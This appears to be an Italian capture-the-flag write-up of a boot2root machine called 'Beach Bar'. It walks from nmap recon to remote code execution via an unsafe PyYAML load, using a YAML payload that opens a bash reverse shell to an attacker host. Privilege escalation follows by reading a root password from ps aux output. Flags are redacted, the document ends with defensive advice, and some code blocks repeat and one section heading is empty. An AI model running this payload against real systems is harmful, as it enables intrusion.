Beach Bar — dal jukebox YAML alla root

Byte Lotus, spiaggia, un jukebox web che accetta richieste da chiunque abbia un telefono. Il DJ però ha lasciato in giro più della musica: una login demo ancora accesa e una feature che si fida troppo del mio YAML. In questa room passo dal view-source a una reverse shell come bartender, e da un processo troppo loquace alla root. Boot2root da manuale, con due lezioni che vedo ancora in produzione.

// TL;DR
  • Recon: solo SSH e HTTP (gunicorn); il web è l'unica via.
  • Login demo dj/dj lasciata nel view-source.
  • Import playlist usa yaml.load unsafe → RCE con !!python/object/apply.
  • Reverse shell come bartender, poi ps aux rivela la password di root.
  • Difesa: safe_load e mai segreti negli argomenti CLI.
// prima di iniziare

Sostituisci <target> con l'IP della macchina e <attacker> con il tuo IP sulla VPN (ip a show tun0). Il listener nc gira sulla tua macchina; dal foothold in poi i comandi girano sul target. Servono: nmap, netcat e un browser.

[01] Ricognizione e superficie

L'IP della macchina va dritto nel browser: si apre «Beach Bar // Sign in», una web app su porta 80. In parallelo lancio nmap per capire con cosa ho a che fare.

# superficie minima: due porte e via
nmap -sC -sV -p- <target> -oN nmap.txt
# 22/tcp open  ssh
# 80/tcp open  http    gunicorn
# minimal surface: two ports and that's it
nmap -sC -sV -p- <target> -oN nmap.txt
# 22/tcp open  ssh
# 80/tcp open  http    gunicorn

Due porte in tutto: SSH e un HTTP servito da gunicorn. Superficie d'attacco minuscola, il che è quasi un suggerimento: la via d'ingresso è il web.

[02] Il login che nessuno ha spento

[03] RCE via PyYAML unsafe load

Una feature che accetta YAML grezzo da un utente autenticato è esattamente il tipo di cosa da testare per l'esecuzione di codice. Apro un listener — ricordandomi di aprire la porta sulla VPN, altrimenti la shell non torna indietro.

# apri PRIMA la porta sulla VPN, poi ascolta
sudo ufw allow 4444/tcp   # se hai un firewall locale
nc -lvnp 4444
# open the port on the VPN FIRST, then listen
sudo ufw allow 4444/tcp   # if you run a local firewall
nc -lvnp 4444
# incollato nel box Import playlist
playlist:
  name: !!python/object/apply:subprocess.check_output [["bash","-c","bash -i >& /dev/tcp/<attacker>/4444 0>&1"]]
  tracks: []
# pasted into the Import playlist box
playlist:
  name: !!python/object/apply:subprocess.check_output [["bash","-c","bash -i >& /dev/tcp/<attacker>/4444 0>&1"]]
  tracks: []

Perché funziona: l'app deserializza il YAML con un loader non sicuro (yaml.load(...) con Loader=yaml.Loader/UnsafeLoader, oppure yaml.unsafe_load()): quel loader ricostruisce oggetti Python arbitrari. Nelle versioni recenti di PyYAML, yaml.load() senza Loader esplicito solleva un errore apposta per impedirlo — qui quella salvaguardia è stata scavalcata. Il tag !!python/object/apply non è «YAML injection»: è un vero gadget di deserializzazione che invoca un callable — qui subprocess.check_output — durante il parsing. È lo stesso pattern di pickle, del readObject in Java o di unserialize in PHP: se il formato ricostruisce oggetti, chi controlla i dati controlla il codice.

Un dettaglio di metodo che vale la pena isolare: check_output blocca finché il comando non termina e solleva un'eccezione se l'exit code è diverso da zero. Se il listener non è ancora in ascolto (o la porta è chiusa sulla VPN), bash -c fallisce, l'eccezione risale e l'app risponde 500 — nessuna shell. Per questo apro porta e listener prima di inviare il payload; in scenari più fragili os.system è più tollerante perché non solleva sul return code.

Torna una shell come bartender. È un po' zoppa (niente frecce, niente tab), quindi la stabilizzo e leggo la prima bandiera.

# TTY decente
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
id            # uid=1000(bartender)
cat user.txt  # THM{████████████████████}
# a decent TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

[04] Privesc: il processo troppo loquace

La root ha richiesto più scavo. Il trucco qui non è un exploit ma l'osservazione: cosa dicono ad alta voce i processi in esecuzione?

# cosa dice ad alta voce un processo
ps aux | grep python
# bartender ... python3 app.py --db-pass=████ ...
su root
# password: ████
cat /root/root.txt   # THM{████████████████████}
# what a process says out loud
ps aux | grep python
# bartender ... python3 app.py --db-pass=████ ...
su root
# password: ████
cat /root/root.txt   # THM{████████████████████}

La lezione tecnica: gli argomenti di qualsiasi processo sono leggibili da chiunque via /proc/PID/cmdline, a meno che /proc non sia montato con hidepid. ps aux | grep python è comodo ma restrittivo: una password passata come flag sulla command line è un segreto pubblico per ogni utente sulla box, non solo per i processi python. Quando faccio enum privesc scorro sempre l'intera colonna COMMAND, non solo il grep che mi aspetto.

// flag — OSCURATA
THM{████████████████████}

La flag qui non la trovi: il valore in sé non insegna niente, e mezzo divertimento è arrivarci. La metodologia sopra è completa e riproducibile — l'ultimo Enter lo batti tu.

// lezione

Due difese concrete. Uno: nel parsing usa sempre yaml.safe_load() — e in generale non deserializzare da input non fidato formati che ricostruiscono oggetti. Due: le password non vanno mai passate come argomenti CLI; usa variabili d'ambiente, file di config con permessi stretti o un secret manager, e valuta hidepid su /proc. E già che ci sei: togli login demo e commenti dal sorgente prima del «soft opening».
